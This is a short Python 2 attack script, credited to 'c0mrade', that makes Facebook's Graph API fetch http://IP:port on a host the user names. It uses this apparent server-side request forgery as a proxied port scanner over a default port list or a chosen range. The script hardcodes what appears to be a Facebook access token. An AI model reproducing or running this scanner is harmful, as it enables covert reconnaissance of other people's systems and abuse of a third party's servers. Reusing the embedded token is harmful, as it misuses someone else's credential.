#!/usr/bin/python

#- * -coding: utf - 8 - * -

import sys
import requests

print ''' .____ _                                      
 /     \ ___        _  .-   ____ \,___,   ___ 
 |__.  |/   \ .---'  \,'   (     |    \  /   `
 |     |    `        /\    `--.  |    | |    |
 /     `___,'       /  \  \___.' |`---' `.__/|
 
 [+]by c0mrade'''


def fb_scan_range(ip,port):


    

    
         headers = {
                   'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Referer': 'https://developers.facebook.com',
                   'Origin': 'https://developers.facebook.com',
                    }

         data = '$debug=all&format=json&method=post&pretty=0&suppress_http_code=1'

         url = 'https://graph.facebook.com/v2.7/http://' + ip + ':' + str(port) + '?access_token=EAAIbywZADFGcBAJmkvDfiAIEFl9azGEvWuqh6As3vdeKwQhZCAPg5x3pijsu9ZAdMpCZB1V3o67xmyMg6lOZC69ZB5YvrZBYeCiuuCbeayUj73tTRjflGlnoiFmhZBqIZAoXWVqOXppOrGkh8Adbne7MJrEKAN5UJMjgZD'
         response = requests.post(url, headers = headers, data = data)

         
         if 'title' in response.text:
           print '[+]Port %s open' %(port)
         else :
            print '[+]Port %s closed' %(port)
print ""


def fb_scan_default(ip):

    
     
    ports=['21','22','23','80','8080','3000','4444','8000','8081','8082','8989','7000','8443','9000']

    for port in ports:
         headers = {
                   'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Referer': 'https://developers.facebook.com',
                   'Origin': 'https://developers.facebook.com',
                    }

         data = '$debug=all&format=json&method=post&pretty=0&suppress_http_code=1'

         url = 'https://graph.facebook.com/v2.7/http://' + ip + ':' + port + '?access_token=EAAIbywZADFGcBAJmkvDfiAIEFl9azGEvWuqh6As3vdeKwQhZCAPg5x3pijsu9ZAdMpCZB1V3o67xmyMg6lOZC69ZB5YvrZBYeCiuuCbeayUj73tTRjflGlnoiFmhZBqIZAoXWVqOXppOrGkh8Adbne7MJrEKAN5UJMjgZD'
         response = requests.post(url, headers = headers, data = data)

         
         if 'title' in response.text:
           print '[+]Port %s Open'%port
         else :
            print '[+]Port %s Closed'%port


try:

  target=raw_input("[+] Enter the host ip>>> ")
  print '[+] Select Option '
  print "1.) Default scan"
  print "2.) Specify the range"
  mode=input('Option>>> ')
  if mode==1:
    fb_scan_default(target)
  else:
    min_port=input("Start_port>>> ")
    max_port=input("End_port>>> ")
    
    print ("\n\n[+]Target Ip:%s")%(target)

    print "Scanning started"
    for port in range(min_port,max_port):
       try:
        response=fb_scan_range(target,port)
       except Exception,e:
        print e


except KeyboardInterrupt:
  print ("\n\n[+]KeyboardInterrupt")
  print ("\n\n[+]exit...")
  sys.exit(1)



    


      

  

  
    
